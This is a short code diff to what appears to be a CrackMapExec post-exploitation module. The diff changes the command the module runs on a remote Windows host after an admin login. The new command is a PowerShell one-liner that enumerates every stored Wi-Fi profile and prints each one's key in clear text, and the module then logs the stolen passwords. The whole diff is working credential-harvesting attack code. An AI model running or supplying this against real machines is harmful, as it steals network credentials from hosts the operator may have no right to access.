@@ -12,7 +12,7 @@ class CMEModule:
 
     def on_admin_login(self, context, connection):
 
-        command = 'netsh.exe wlan show profiles name=* key=clear'
+        command = 'powershell.exe -c "(netsh wlan show profiles) | Select-String """"\:(.+)$"""" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}'
         context.log.info('Executing command')
         p = connection.execute(command, True)
         context.log.success(p)
